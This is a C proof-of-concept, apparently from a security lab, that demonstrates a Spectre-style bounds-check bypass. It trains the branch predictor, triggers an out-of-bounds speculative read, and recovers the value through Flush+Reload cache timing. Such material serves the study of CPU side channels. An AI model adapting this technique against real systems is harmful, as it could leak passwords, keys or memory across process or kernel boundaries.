#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include "cacheutils.h"

#define DELTA 1024

uint64_t CACHE_HIT_THRESHOLD; 
int size = 10;
uint8_t array[256*4096];
uint8_t temp = 0;

void flushSideChannel()
{
  int i;

  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;

  //flush the values of the array from cache
  for (i = 0; i < 256; i++) flush(&array[i*4096 +DELTA]);
}

void reloadSideChannel()
{
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;
  for(i = 0; i < 256; i++){
    time1 = rdtsc();
    maccess(&array[i*4096 + DELTA]);
    time2 = rdtsc() - time1;
    if (time2 <= CACHE_HIT_THRESHOLD){
	printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
        printf("The Secret = %d.\n", i);
    }
  } 
}

void victim(size_t x)
{
  if (x < size) {  
      temp = array[x * 4096 + DELTA];  
  }
}

int main() {
  int i;

  CACHE_HIT_THRESHOLD = detect_flush_reload_threshold();

  printf("LLC miss threshold: %ld\n", CACHE_HIT_THRESHOLD);


  // FLUSH the probing array
  flushSideChannel();

  // Train the CPU to take the true branch inside victim()
  for (i = 0; i < 10; i++) {   
      victim(i);
  }

  // Exploit the out-of-order execution
  flush(&size);
  for (i = 0; i < 256; i++)
      flush(&array[i*4096 + DELTA]); 
  victim(97);  

  // RELOAD the probing array
  reloadSideChannel();

  return (0); 
}
